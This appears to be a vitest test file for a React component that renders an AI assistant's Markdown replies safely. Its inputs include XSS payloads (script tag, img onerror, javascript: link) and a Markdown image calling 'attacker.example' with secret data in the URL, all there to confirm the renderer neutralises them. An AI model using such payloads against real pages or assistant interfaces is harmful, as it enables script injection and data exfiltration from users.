import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { MarkdownText } from './MarkdownText';

const render = (text: string) => renderToStaticMarkup(createElement(MarkdownText, { text }));

describe('assistant Markdown', () => {
  it('renders bold, lists, and code', () => {
    const html = render('- **Proposal id:** 94\n- Status: `proposed`');
    expect(html).toContain('<strong>Proposal id:</strong>');
    expect(html).toMatch(/<ul[^>]*>\s*<li>/);
    expect(html).toMatch(/<code[^>]*>proposed<\/code>/);
  });

  it('keeps raw HTML as text', () => {
    const html = render('Hi <script>alert(1)</script> <img src=x onerror=alert(1)> <button>Approve</button>');
    expect(html).not.toMatch(/<script|<img|<button/);
    expect(html).toContain('&lt;script&gt;');
  });

  it('drops unsafe links and opens safe ones in a new tab without a referrer', () => {
    expect(render('[click](javascript:alert(1))')).not.toContain('javascript:');
    expect(render('[site](https://example.com)')).toContain('href="https://example.com" target="_blank" rel="noopener noreferrer"');
  });

  it('never loads Markdown images', () => {
    const html = render('![chart](https://attacker.example/leak?data=secret)');
    expect(html).not.toContain('<img');
    expect(html).toContain('[image: chart (https://attacker.example/leak?data=secret)]');
  });
});
